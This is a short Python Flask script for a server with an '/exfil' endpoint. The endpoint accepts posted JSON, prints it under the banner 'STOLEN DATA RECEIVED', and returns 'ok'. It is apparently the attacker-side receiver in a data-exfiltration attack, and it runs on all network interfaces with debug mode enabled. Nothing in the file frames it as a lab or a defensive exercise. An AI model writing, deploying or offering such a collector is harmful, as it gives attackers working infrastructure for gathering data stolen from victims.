from flask import Flask, request, jsonify
app = Flask(__name__)

@app.route('/exfil', methods=['POST'])
def exfil():
    data = request.json
    print("\n=== STOLEN DATA RECEIVED ===")
    print(data)
    print("===========================\n")
    return jsonify({"status": "ok"}), 200

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000, debug=True)
    